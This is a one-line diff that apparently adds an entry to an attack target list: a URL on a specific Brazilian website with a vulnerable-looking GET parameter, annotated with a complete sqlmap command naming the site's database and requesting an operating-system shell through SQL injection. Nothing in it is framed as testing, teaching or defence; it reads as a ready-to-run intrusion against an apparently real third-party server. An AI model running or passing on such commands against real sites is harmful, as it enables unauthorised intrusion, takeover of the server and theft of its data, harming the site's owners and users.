@@ -1,0 +1,1 @@
+http://www.comunicarmais.com.br/clique.php?codigo=10 (GET)  # sqlmap.py -u http://www.comunicarmais.com.br/clique.php?codigo=10 -D bd_comunicarmais --os-shell
